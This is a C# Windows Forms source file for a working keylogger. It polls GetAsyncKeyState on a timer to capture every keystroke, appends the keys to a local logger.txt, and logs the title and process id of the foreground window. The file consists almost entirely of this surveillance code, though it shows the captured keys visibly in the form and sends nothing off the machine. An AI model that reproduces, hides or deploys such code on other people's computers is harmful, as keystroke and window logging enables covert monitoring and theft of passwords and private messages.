using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp_07._03._25
{
    public partial class Form1: Form
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);

        public String buf = "";
           
        public Form1()
        {
            InitializeComponent();
            timer1.Start();
            timer2.Start();

            CultureInfo culture = CultureInfo.CurrentCulture;

            string languageCode = culture.TwoLetterISOLanguageName;

            string languageName = culture.DisplayName;

            richTextBox2.Text += "Код языка: " + languageCode + "\n";
            richTextBox2.Text += "Название кода: " + languageName + "\n";
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
            for (int key = 7; key < 256; key++)
            {
                int state = GetAsyncKeyState(key);

                if (state != 0)
                {
                    //richTextBox1.Text += ((Keys)key);
                    richTextBox1.Text += ((KeysRu)key).ToString().ToUpper();
                    buf += ((KeysRu)key).ToString().ToUpper();
                }
            }

            if (buf.Length > 20)
            {
                WriteToTxt(buf);
                buf = "";
            }

        }

        private void timer2_Tick_1(object sender, EventArgs e)
        {
            IntPtr h = GetForegroundWindow();
            int pid = 0;
            GetWindowThreadProcessId(h, ref pid);
            Process p = Process.GetProcessById(pid);
            richTextBox2.Text += "id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n";

        }

        private void WriteToTxt(string value) {
            StreamWriter stream = new StreamWriter("./logger.txt", true);
            stream.Write(value);
            stream.Close();        }
    }
}
